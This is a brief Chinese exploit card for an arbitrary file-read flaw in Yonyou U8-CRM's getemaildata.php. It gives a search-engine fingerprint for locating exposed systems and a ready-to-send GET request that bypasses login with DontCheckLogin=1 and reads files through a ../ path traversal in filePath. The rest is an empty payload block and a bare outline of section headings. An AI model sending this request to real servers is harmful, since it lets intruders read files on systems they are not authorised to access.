# 用友U8-CRMgetemaildata.php任意文件读取漏洞

- **系统**：用友　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="用友 CRM"`
- **请求**：`GET /ajax/getemaildata.php?DontCheckLogin=1&filePath=../version.txt HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: PHPSESSID=p8t1stkmi6nd9jjda4vsenjob6`

**请求体 / payload**
```

```

**其他**
- 用友U8-CRM getemaildata.php任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8-CRM